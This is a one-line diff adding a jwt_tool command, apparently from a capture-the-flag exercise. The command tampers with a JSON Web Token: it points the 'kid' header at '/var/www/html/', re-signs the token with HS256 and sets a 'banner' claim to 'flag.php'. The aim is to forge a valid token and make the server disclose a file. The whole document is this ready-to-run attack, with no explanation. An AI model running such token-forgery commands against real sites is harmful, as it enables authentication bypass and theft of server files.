@@ -1,0 +1,1 @@
+python3 jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6IlwvdG1wXC9qd3Qua2V5In0.eyJiYW5uZXIiOiJiYW5uZXJcLzUucG5nIn0.Fq35A3IqblXCqL9HLEQStEWc5t5VJUOYz27pLgF9WAY -I -hc kid -hv "/var/www/html/" -S hs256 -pc banner -pv "flag.php"
